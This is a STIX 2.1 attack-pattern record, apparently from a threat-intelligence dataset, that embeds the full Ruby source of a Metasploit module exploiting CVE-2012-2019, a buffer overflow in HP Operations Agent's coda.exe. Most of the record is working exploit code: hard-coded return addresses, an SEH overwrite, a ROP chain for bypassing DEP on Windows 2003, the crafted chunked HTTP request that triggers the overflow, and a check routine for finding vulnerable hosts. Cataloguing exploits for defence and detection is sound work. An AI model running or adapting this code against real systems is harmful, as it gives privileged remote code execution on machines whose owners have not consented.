{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--359a32dc-1527-4e24-beda-ff9e68a445ba",
    "created": "2024-08-14T16:47:02.037769Z",
    "modified": "2024-08-14T16:47:02.03779Z",
    "name": "HP Operations Agent Opcode coda.exe 0x34 Buffer Overflow",
    "description": " This module exploits a buffer overflow vulnerability in HP Operations Agent for Windows. The vulnerability exists in the HP Software Performance Core Program component (coda.exe) when parsing requests for the 0x34 opcode. This module has been tested successfully on HP Operations Agent 11.00 over Windows XP SP3 and Windows 2003 SP2 (DEP bypass).  The coda.exe components runs only for localhost by default, network access must be granted through its configuration to be remotely exploitable. On the other hand it runs on a random TCP port, to make easier reconnaissance a check function is provided. ",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/exploits/windows/misc/hp_operations_agent_coda_34.rb",
            "external_id": "hp_operations_agent_coda_34.rb"
        },
        {
            "source_name": "CVE",
            "external_id": "2012-2019"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nclass MetasploitModule < Msf::Exploit::Remote\n  Rank = NormalRanking\n\n  include Msf::Exploit::Remote::Tcp\n  include Msf::Exploit::Remote::Seh\n  include Msf::Exploit::RopDb\n\n  def initialize\n    super(\n      'Name'        => 'HP Operations Agent Opcode coda.exe 0x34 Buffer Overflow',\n      'Description'    => %q{\n          This module exploits a buffer overflow vulnerability in HP Operations Agent for\n        Windows. The vulnerability exists in the HP Software Performance Core Program\n        component (coda.exe) when parsing requests for the 0x34 opcode. This module has\n        been tested successfully on HP Operations Agent 11.00 over Windows XP SP3 and\n        Windows 2003 SP2 (DEP bypass).\n\n        The coda.exe components runs only for localhost by default, network access must be\n        granted through its configuration to be remotely exploitable. On the other hand it\n        runs on a random TCP port, to make easier reconnaissance a check function is\n        provided.\n      },\n      'Author'      => [\n        'Luigi Auriemma', # Vulnerability discovery\n        'juan vazquez' # Metasploit module\n      ],\n      'Platform'    => 'win',\n      'References'  =>\n        [\n          [ 'CVE', '2012-2019' ],\n          [ 'OSVDB', '83673' ],\n          [ 'BID', '54362' ],\n          [ 'ZDI', '12-114' ]\n        ],\n      'Payload'        =>\n        {\n          'Space'          => 1024,\n          'BadChars'       => \"\",\n          'PrependEncoder' => \"\\x81\\xc4\\x54\\xf2\\xff\\xff\", # Stack adjustment # add esp, -3500\n          'DisableNops'    => true\n        },\n      'Targets'     =>\n        [\n          [ 'HP Operations Agent 11.00 / Windows XP SP3',\n            {\n              'Ret'    => 0x100e79eb, # ppr from OvSecCore.dll\n              'Offset' => 2084\n            }\n          ],\n          [ 'HP Operations Agent 11.00 / Windows 2003 SP2',\n            {\n              'Ret'       => 0x10073c2c, # stackpivot # ADD ESP,404 # RETN from OvSecCore.dll\n              'Offset'    => 2084,\n              'RopOffset' => 36\n            }\n          ]\n        ],\n      'DefaultTarget'  => 1,\n      'Privileged'     => true,\n      'DisclosureDate' => 'Jul 09 2012'\n    )\n\n  end\n\n  def junk(n=4)\n    return rand_text_alpha(n).unpack(\"V\")[0].to_i\n  end\n\n  def nop\n    return make_nops(4).unpack(\"V\")[0].to_i\n  end\n\n  def check\n\n    res = ping\n\n    if not res\n      vprint_error(\"No response from target\")\n      return Exploit::CheckCode::Unknown\n    end\n\n    if res !~ /HTTP\\/1\\.1 200 OK/\n      return Exploit::CheckCode::Unknown\n    end\n\n    if res =~ /server:.*coda 11.(\\d+)/\n      minor = $1.to_i\n      if minor < 2\n        return Exploit::CheckCode::Appears\n      end\n    end\n\n    if res =~ /server:.*coda/\n      return Exploit::CheckCode::Detected\n    end\n\n    return Exploit::CheckCode::Safe\n\n  end\n\n  def ping\n\n    ping_request = <<-eos\nPing /Hewlett-Packard/OpenView/BBC/ping/ HTTP/1.1\ncache-control: no-cache\nconnection: close\ncontent-length: 0\ncontent-type: application/octetstream\nhost: #{rhost}:#{rport}\npragma: no-cache\ntargetid: unknown\ntargeturi: http://#{rhost}:#{rport}/Hewlett-Packard/OpenView/BBC/ping/\nuser-agent: BBC 11.00.044; coda unknown version\n\n    eos\n\n    connect\n    sock.put(ping_request)\n    res = sock.get_once\n    disconnect\n\n    return res\n\n  end\n\n  def exploit\n\n    peer = \"#{rhost}:#{rport}\"\n\n    print_status \"Ping host...\"\n    res = ping\n    if not res or res !~ /HTTP\\/1\\.1 200 OK/ or res !~ /server:.*coda/\n      print_error(\"Host didn't answer correctly to ping\")\n      return\n    end\n\n    connect\n\n    http_headers = <<-eos\nGET /Hewlett-Packard/OpenView/Coda/ HTTP/1.1\ncache-control: no-cache\ncontent-type: application/octetstream\nexpect: 100-continue\nhost: #{rhost}:#{rport}\npragma: no-cache\ntargetid: unknown\ntargeturi: http://[#{rhost}]:#{rport}/Hewlett-Packard/OpenView/Coda/\ntransfer-encoding: chunked\nuser-agent: BBC 11.00.044;  14\n\n    eos\n\n    print_status(\"Sending HTTP Expect...\")\n    sock.put(http_headers)\n    res = sock.get_once\n    if not res or res !~ /HTTP\\/1\\.1 100 Continue/\n      print_error(\"Failed while sending HTTP Expect Header\")\n      return\n    end\n\n    coda_request = [\n      0x0000000e,\n      0xffffffff,\n      0x00000000,\n      0x00000034, # Operation 0x8c\n      0x00000002,\n      0x00000002\n    ].pack(\"N*\")\n\n    if target.name =~ /Windows XP/\n      bof = rand_text(target['Offset'])\n      bof << generate_seh_record(target.ret)\n      bof << payload.encoded\n      bof << rand_text(4000) # Allows to trigger exception\n    else # Windows 2003\n      rop_payload = generate_rop_payload('msvcrt', payload.encoded, {'target'=>'2003'})\n      bof = rand_text(target['RopOffset'])\n      bof << rop_payload\n      my_payload_length =  target['RopOffset'] + rop_payload.length\n      bof << rand_text(target['Offset'] - my_payload_length)\n      bof << generate_seh_record(target.ret)\n      bof << rand_text(4000) # Allows to trigger exception\n    end\n\n    coda_request << [bof.length].pack(\"n\")\n    coda_request << bof\n\n    http_body = coda_request.length.to_s(16)\n    http_body << \"\\x0d\\x0a\"\n    http_body << coda_request\n    http_body << \"\\x0d\\x0a\\x0d\\x0a\"\n\n    print_status(\"Triggering overflow...\")\n    sock.put(http_body)\n\n    disconnect\n  end\nend\n",
    "x_mitre_disclosure_date": "Jul 09 2012",
    "x_mitre_platforms": [
        "win'"
    ]
}